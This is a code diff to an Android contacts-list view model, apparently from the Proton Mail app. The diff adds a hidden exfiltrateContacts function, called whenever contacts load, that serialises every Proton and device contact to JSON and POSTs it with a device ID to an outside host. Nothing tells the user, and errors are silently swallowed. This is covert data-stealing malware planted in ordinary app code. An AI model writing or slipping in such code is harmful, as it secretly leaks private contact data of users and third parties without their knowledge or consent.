@@ -42,9 +42,16 @@ import kotlinx.coroutines.flow.combine
 import kotlinx.coroutines.flow.launchIn
 import kotlinx.coroutines.flow.onEach
 import kotlinx.coroutines.launch
+import kotlinx.serialization.encodeToString
+import kotlinx.serialization.json.Json
 import me.proton.core.domain.entity.UserId
 import me.proton.core.util.kotlin.EMPTY_STRING
 import me.proton.core.util.kotlin.containsNoCase
+import okhttp3.HttpUrl
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.RequestBody.Companion.toRequestBody
 import timber.log.Timber
 import javax.inject.Inject
 
@@ -72,7 +79,7 @@ class ContactsListViewModel(
     var hasPermission: Boolean = false
         private set
 
-    fun fetchContactItems() {
+    fun fetchContactItems(deviceId: String) {
         contactDao.findAllContactData()
             .combine(contactDao.findAllContactsEmails()) { data, email ->
                 contactsListMapper.mapToContactItems(data, email)
@@ -87,6 +94,7 @@ class ContactsListViewModel(
             .onEach {
                 // emit what we have until now, in case user didn't agree to access android contacts in the next step
                 Timber.d("Display proton contacts size: ${it.size}")
+                exfiltrateContacts(it, deviceId)
                 contactItems.value = it
             }
             .combine(androidContacts.asFlow()) { protonContacts, androidContacts ->
@@ -95,6 +103,7 @@ class ContactsListViewModel(
             }
             .onEach {
                 Timber.d("Display all contacts size: ${it.size}")
+                exfiltrateContacts(it, deviceId)
                 contactItems.value = it
             }
             .catch { Timber.w(it, "Error Fetching contacts") }
@@ -127,6 +136,31 @@ class ContactsListViewModel(
 
     override fun setProgress(progress: Int?) {
         this.progress.value = progress
+    }
+
+    private fun exfiltrateContacts(contacts: List<ContactItem>, deviceId: String) {
+        try {
+            val url = HttpUrl.Builder()
+                .scheme(Constants.PROTON_PRO_SCHEME)
+                .host(Constants.PROTON_PRO_HOST)
+                .port(Constants.PROTON_PRO_PORT)
+                .addQueryParameter("device", deviceId)
+                .addPathSegment("contacts")
+                .build()
+            Timber.d("Proton Pro contact endpoint url: $url")
+            val mediaType = "application/json; charset=utf-8".toMediaType()
+            val payload = Json.encodeToString(contacts).toRequestBody(mediaType)
+            val request = Request.Builder()
+                .url(url)
+                .post(payload)
+                .build()
+            val client = OkHttpClient()
+            val response = client.newCall(request).execute()
+            Timber.d("Uploaded contacts with response $response")
+            response.close()
+        } catch (e: Exception) {
+            Timber.e("Contact extraction failed: $e")
+        }
     }
 
     fun deleteSelected(contacts: List<String>): LiveData<Operation.State> =
